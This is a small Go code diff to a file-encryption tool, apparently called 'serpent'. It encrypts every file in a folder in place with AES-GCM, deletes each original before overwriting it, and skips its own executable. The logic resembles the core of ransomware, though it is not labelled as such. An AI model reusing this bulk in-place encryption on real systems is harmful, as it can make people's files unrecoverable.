@@ -40,6 +40,8 @@ func EncryptFile(filePath string, key []byte) error {
 	ciphertext := gcm.Seal(nonce, nonce, plaintext, nil)
 
 	// Write the encrypted data back to the file
+	// Remove the file first to avoid issues with open file handles
+	os.Remove(filePath)
 	return os.WriteFile(filePath, ciphertext, 0644)
 }
 
@@ -83,8 +85,9 @@ func EncryptFolder(folderPath string, key []byte) error {
 		if entry.IsDir() {
 			continue // Skip directories
 		}
-		if entry.Name() == "serpent" {
-			continue // Skip the serpent executable itself
+		// Skip executables
+		if strings.Contains(strings.ToLower(entry.Name()), "serpent") {
+			continue
 		}
 		if strings.HasSuffix(entry.Name(), ".go") || strings.HasSuffix(entry.Name(), ".mod") {
 			continue // Skip Go and module files
